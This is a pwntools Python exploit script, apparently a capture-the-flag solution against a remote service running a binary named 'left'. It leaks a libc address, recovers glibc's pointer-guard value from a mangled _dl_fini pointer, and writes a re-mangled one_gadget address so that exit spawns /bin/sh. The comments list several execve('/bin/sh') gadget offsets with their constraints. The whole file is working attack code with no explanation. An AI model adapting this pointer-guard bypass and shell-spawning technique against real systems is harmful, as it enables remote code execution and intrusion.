from pwn import *

context.log_level = "debug"
HOST = "159.203.116.12"
PORT = 7777
#conn = process("./left", env={"LD_PRELOAD":"./libc-2.23.so"})
conn = remote(HOST, PORT)
conn.recvuntil("printf(): ")
#0000000000055800 T printf
LIBC = int(conn.recvuntil("\n")[:-1]) - 0x55800
log.success("LIBC :0x%x" % LIBC)
#0x7f07b244dc58
#LIBC :0x7f07b2088000
conn.sendlineafter("read address:", str(LIBC + 0x7f07b244dc58 - 0x7f07b2088000))
conn.recvuntil("content: ")
LEAK_INT = int(conn.recvuntil("\n")[:-1])
log.success("LEAK_INT :0x%x" % LEAK_INT)
#0x7fc1a500fab0 (<_dl_fini>
#LIBC :0x7fc1a4c35000
DL_FINI = LIBC + 0x7fc1a500fab0 - 0x7fc1a4c35000
log.success("DL_FINI :0x%x" % DL_FINI)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

FS_30 = DL_FINI ^ ror(LEAK_INT, 0x11, 64)
log.success("FS_30 :0x%x" % FS_30)
#0x7f07b244dc58
#LIBC :0x7f07b2088000
conn.sendlineafter("write address:", str(LIBC + 0x7f07b244dc58 - 0x7f07b2088000))
#0x45216	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  rax == NULL
#
#0x4526a	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  [rsp+0x30] == NULL
#
#0xf0274	execve("/bin/sh", rsp+0x50, environ)
#constraints:
#  [rsp+0x50] == NULL
#
#0xf1117	execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL
pause()
conn.sendlineafter("new value:", str(rol((FS_30 ^ (LIBC + 0x4526a)), 0x11, 64)))
conn.interactive()
